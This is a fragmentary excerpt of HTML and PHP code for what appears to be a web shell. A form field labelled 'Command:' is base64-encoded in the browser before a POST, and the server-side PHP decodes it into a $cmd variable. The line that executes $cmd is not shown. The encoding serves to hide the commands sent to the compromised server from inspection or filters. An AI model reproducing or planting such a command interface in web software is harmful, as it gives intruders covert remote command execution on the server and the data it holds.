...
<html>
	...
	<script type="text/javascript">
		function processBeforeSubmit() {
  			document.postForm.mycmd.value = btoa(document.postForm.mycmd.value);
			return true;
		}
	</script>

	<!-- Commands sent using POST method-->
	<form  name="postForm" method="POST" onsubmit="processBeforeSubmit();">
		Command:
...
<?php
	...
	{
		$cmd = base64_decode($_REQUEST['mycmd']);
